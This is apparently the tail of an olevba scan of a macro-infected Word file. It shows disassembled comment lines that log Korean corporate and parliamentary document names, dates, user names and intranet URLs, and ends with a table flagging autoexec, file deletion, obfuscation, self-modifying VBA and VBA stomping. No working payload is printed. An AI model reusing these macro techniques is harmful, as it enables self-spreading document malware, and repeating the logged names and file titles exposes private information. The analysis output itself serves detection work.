' 	QuoteRem 0x0000 0x0031 " 강인섭의원-한중DCM골프회원권(경영관리부1009).doc"
' Line #1855:
' Line #1856:
' 	QuoteRem 0x0000 0x0024 " Calculation of Tentative Price2.doc"
' Line #1857:
' Line #1858:
' 	QuoteRem 0x0000 0x002D " 별첨 1,3 Calculation of Tentative Price2.doc"
' Line #1859:
' Line #1860:
' 	QuoteRem 0x0000 0x002D " Final Draft_ HFControls 업무진행상황보고.doc"
' Line #1861:
' Line #1862:
' 	QuoteRem 0x0000 0x001B " 세금계산서입금표청구서.doc"
' Line #1863:
' Line #1864:
' 	QuoteRem 0x0000 0x0018 " 대외공문(국문.워드).doc"
' Line #1865:
' Line #1866:
' 	QuoteRem 0x0000 0x0019 " 대외공문2(국문.워드).doc"
' Line #1867:
' Line #1868:
' 	QuoteRem 0x0000 0x002B " 이인기의원-출자회사복비및 인건비(1012).doc"
' Line #1869:
' Line #1870:
' 	QuoteRem 0x0000 0x0036 " 관계회사 결손금 발생 사유 및 대책(투자설명회0918).doc"
' Line #1871:
' Line #1872:
' 	QuoteRem 0x0000 0x001B " 2000국회예상질의답변서.doc"
' Line #1873:
' Line #1874:
' 	QuoteRem 0x0000 0x0025 " 06:00:47 오후 -Wednesday,18 Oct,2000"
' Line #1875:
' 	QuoteRem 0x0000 0x0007 " 김정오"
' Line #1876:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1877:
' 	QuoteRem 0x0000 0x0010 " 경영관리부6.doc"
' Line #1878:
' Line #1879:
' 	QuoteRem 0x0000 0x0010 " 경영관리부5.doc"
' Line #1880:
' Line #1881:
' 	QuoteRem 0x0000 0x0010 " 경영관리부4.doc"
' Line #1882:
' Line #1883:
' 	QuoteRem 0x0000 0x0010 " 경영관리부3.doc"
' Line #1884:
' Line #1885:
' 	QuoteRem 0x0000 0x0024 " 최근투자부진(김방림-연구지원부).doc"
' Line #1886:
' Line #1887:
' 	QuoteRem 0x0000 0x0010 " 경영관리부2.doc"
' Line #1888:
' Line #1889:
' 	QuoteRem 0x0000 0x0010 " 경영관리부1.doc"
' Line #1890:
' Line #1891:
' 	QuoteRem 0x0000 0x0017 " HSD 신주발행(국회).doc"
' Line #1892:
' Line #1893:
' 	QuoteRem 0x0000 0x0018 " 현대 임대장비(국회).doc"
' Line #1894:
' Line #1895:
' 	QuoteRem 0x0000 0x001C " 진행중인 쟁송사안(국회).doc"
' Line #1896:
' Line #1897:
' 	QuoteRem 0x0000 0x0018 " 삼성 경업금지(국회).doc"
' Line #1898:
' Line #1899:
' 	QuoteRem 0x0000 0x0016 " 대우 어음금(국회).doc"
' Line #1900:
' Line #1901:
' 	QuoteRem 0x0000 0x0021 " 맹형규(공공부문구조조정)실태.doc"
' Line #1902:
' Line #1903:
' 	QuoteRem 0x0000 0x0014 " 나머지 SCHEDULE.doc"
' Line #1904:
' Line #1905:
' 	QuoteRem 0x0000 0x001C " 배기운의원국감-내연발전.doc"
' Line #1906:
' Line #1907:
' 	QuoteRem 0x0000 0x002E " 001017-국정감사예상 질의 답변(기술관리부).doc"
' Line #1908:
' Line #1909:
' 	QuoteRem 0x0000 0x0025 " 03:49:05 오후 -Wednesday,18 Oct,2000"
' Line #1910:
' 	QuoteRem 0x0000 0x0007 " 이창훈"
' Line #1911:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1912:
' 	QuoteRem 0x0000 0x002E " 001017-국정감사예상 질의 답변(기술관리부).doc"
' Line #1913:
' Line #1914:
' 	QuoteRem 0x0000 0x0022 " 001017-국정감사예상 질의 답변.doc"
' Line #1915:
' Line #1916:
' 	QuoteRem 0x0000 0x0013 " 회의소집통보서.doc"
' Line #1917:
' Line #1918:
' 	QuoteRem 0x0000 0x000F " 기술관리부.doc"
' Line #1919:
' Line #1920:
' 	QuoteRem 0x0000 0x0024 " 10:01:36 오전 -Thursday,19 Oct,2000"
' Line #1921:
' 	QuoteRem 0x0000 0x0008 " HANJUNG"
' Line #1922:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1923:
' 	QuoteRem 0x0000 0x001B " load_file.asp?id=2077&no=1"
' Line #1924:
' Line #1925:
' 	QuoteRem 0x0000 0x000D " 보강beam.doc"
' Line #1926:
' Line #1927:
' 	QuoteRem 0x0000 0x0022 " 02:02:30 오후 -Monday,23 Oct,2000"
' Line #1928:
' 	QuoteRem 0x0000 0x0008 " HANJUNG"
' Line #1929:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1930:
' 	QuoteRem 0x0000 0x000D " 보강beam.doc"
' Line #1931:
' Line #1932:
' 	QuoteRem 0x0000 0x001B " load_file.asp?id=2109&no=1"
' Line #1933:
' Line #1934:
' 	QuoteRem 0x0000 0x0013 " 전산업무요청서.doc"
' Line #1935:
' Line #1936:
' 	QuoteRem 0x0000 0x0022 " 08:53:26 오전 -Monday,30 Oct,2000"
' Line #1937:
' 	QuoteRem 0x0000 0x0008 " HANJUNG"
' Line #1938:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1939:
' 	QuoteRem 0x0000 0x0013 " 전산업무요청서.doc"
' Line #1940:
' Line #1941:
' 	QuoteRem 0x0000 0x001B " load_file.asp?id=2145&no=1"
' Line #1942:
' Line #1943:
' 	QuoteRem 0x0000 0x000C " DrumRod.doc"
' Line #1944:
' Line #1945:
' 	QuoteRem 0x0000 0x0014 " equivalent_tube.doc"
' Line #1946:
' Line #1947:
' 	QuoteRem 0x0000 0x0023 " 11:36:57 오전 -Tuesday,31 Oct,2000"
' Line #1948:
' 	QuoteRem 0x0000 0x0008 " HANJUNG"
' Line #1949:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1950:
' 	QuoteRem 0x0000 0x0014 " equivalent_tube.doc"
' Line #1951:
' Line #1952:
' 	QuoteRem 0x0000 0x0012 " hsintao(OMRF).doc"
' Line #1953:
' Line #1954:
' 	QuoteRem 0x0000 0x0021 " 03:37:29 오후 -Monday,6 Nov,2000"
' Line #1955:
' 	QuoteRem 0x0000 0x0008 " HANJUNG"
' Line #1956:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1957:
' 	QuoteRem 0x0000 0x000C " hsintao.doc"
' Line #1958:
' Line #1959:
' 	QuoteRem 0x0000 0x000D " PRINTING.doc"
' Line #1960:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

